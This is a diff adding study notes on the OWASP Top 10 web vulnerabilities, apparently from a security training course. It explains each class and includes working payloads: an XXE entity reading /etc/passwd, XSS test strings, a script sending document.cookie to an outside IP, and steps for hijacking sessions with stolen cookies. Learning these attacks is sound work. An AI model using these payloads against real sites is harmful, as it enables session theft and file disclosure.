@@ -92,3 +92,104 @@ Mitigate
 * in-band XXE = receive an immediate response to the XXE payload
 * out-of-band XXE (OOB-XXE / blind XXE) = no immediate response from we app, have to reflect the output to some other file on their own server
 
+```
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<root>&read;</root>
+```
+
+## 5. Broken Access Control
+* visitor able to access protected page(s) that they are not authorised to view
+  * being able to view sensitive info
+  * accessing unauthorized functionality
+* OWASP scenarios
+  * Scenario 1
+
+```
+The application uses unverified data in a SQL call that is accessing account information:
+pstmt.setString(1, request.getParameter("acct"));
+ResultSet results = pstmt.executeQuery( );
+
+An attacker simply modifies the ‘acct’ parameter in the browser to send whatever account number they want. If not properly verified, the attacker can access any user’s account.
+http://example.com/app/accountInfo?acct=notmyacct
+```
+  * Scenario 2
+```
+An attacker simply force browses to target URLs. Admin rights are required for access to the admin page.
+http://example.com/app/getappInfo
+http://example.com/app/admin_getappInfo
+```
+
+* IDOR - Insecure Direct Object Reference
+  * IDOR, or Insecure Direct Object Reference, is the act of exploiting a misconfiguration in the way user input is handled, to access resources you wouldn't ordinarily be able to access
+  * If the site incorrectly configured user could just change https://site.com/account=1 to https://site.com/account=2
+
+## 6. Security Misconfiguration
+* permissions configured poorly on cloud services (S3 bucket)
+* unneeded services, pages, accounts or privileges enabled
+* default accounts/passwords
+* overly detailed error messages
+* not using HTTP security headers
+
+## 7. Cross-Site Scripting (XSS)
+* type of injection which can allow an attacker to execute malicious scripts and have it execute on a victim’s machine
+* web app vulnerable to XSS if it doesn't sanitize user input
+* XXS is possible on Javascript, VBScript, Flash, CSS
+* Types of XX
+  * Stored XSS
+    * most dangerous XSS, malicious string inserted into the database (so the string originates from the websites db)
+  * Reflected XSS 
+    * malicious payload part of victims request to the website
+    * site includes this payload in response back to the user
+    * basically trick the user in clicking URL to execute malicious payload
+  * DOM-Based XSS
+    * DOM - Document Object Model, programming interface for HTML and XML docs
+    * represents the page so that programs can change the document structure, style and content
+ * XXS Payloads, commons
+  * (<script>alert(“Hello World”)</script>) - creates popup
+  * (document.write) - Override the website's HTML to add your own
+  * (http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html) - XSS keylogger
+  * (http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html) - local port scanner
+
+```
+- search/comment boxes should be tested first
+- <h1>Hi</h1> -will test if input is sanitized or not
+- test if javascript allowed <script>alert('XSS');</script>
+- print out cookies <script>alert(document.cookie);</script>
+- steal others cookies > use 'firebug' to login with that cookie
+
+-cookies to another pc
+<script>
+var i = new Image();
+i.src="http://192.168.99.11/get.php?cookies="+document.cookie;
+</script>
+
+-once you get cookie use firebug or "shift + F9" > storage > insert cookie in session
+
+Replace HTML: <script>document.querySelector('#thm-title').textContent = 'My text here'</script>
+```
+
+## 8. Insecure Deserialization
+* replacing data processed by an application with malicious code
+* allows anything from DoS to RCE
+* no reliable tool/framework - exploit only as dangerous as attackers skills
+* any application that stores or fetches data where there are no validations or integrity checks in place for the data queried or retained
+  * E-Commerce Sites, Forums, APIs, Application runtimes (tomcat, jenkins...)
+* cookies on FF = inspect element > storage
+* https://gist.github.com/CMNatic/af5c19a8d77b4f5d8171340b9c560fc3
+
+## 9. Components with Known Vulnerabilities
+* easy to miss an update
+* you can search for "application X.X" and find exploits
+* or exploit-db.com
+
+## 10. Insufficient Logging and Monitoring
+* What you should log:
+  * HTTP status codes
+  * Time Stamps
+  * Usernames
+  * API endpoints/page locations
+  * IP addresses
+* logging important, actions can be traced, risk and impact can be then determined
+* if no logging: regulatory damage, risk of further attacks
+
